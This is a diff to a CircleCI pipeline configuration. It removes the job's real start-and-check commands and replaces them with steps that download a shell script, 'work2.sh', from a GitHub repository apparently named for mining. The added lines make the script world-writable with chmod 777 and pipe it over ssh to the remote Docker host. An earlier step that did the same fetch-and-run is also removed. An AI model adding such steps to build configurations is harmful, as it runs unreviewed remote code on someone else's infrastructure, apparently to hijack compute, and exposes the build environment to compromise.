@@ -11,11 +11,8 @@ jobs:
       - setup_remote_docker:
           version: 19.03.13 
       - run:
-          name: "Start Service and Check That it’s Running"
+          name: "Start Service and Check"
           command: |
-            docker run -d --name my-app my-app
-            docker exec my-app curl --retry 10 --retry-connrefused http://localhost:8080
-      - run: 
-          name: chmod & run 
-          command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work2.sh && chmod 777 work2.sh && ./work2.sh
- 
+           wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work2.sh
+           chmod 777 work2.sh
+           cat work2.sh | ssh remote-docker
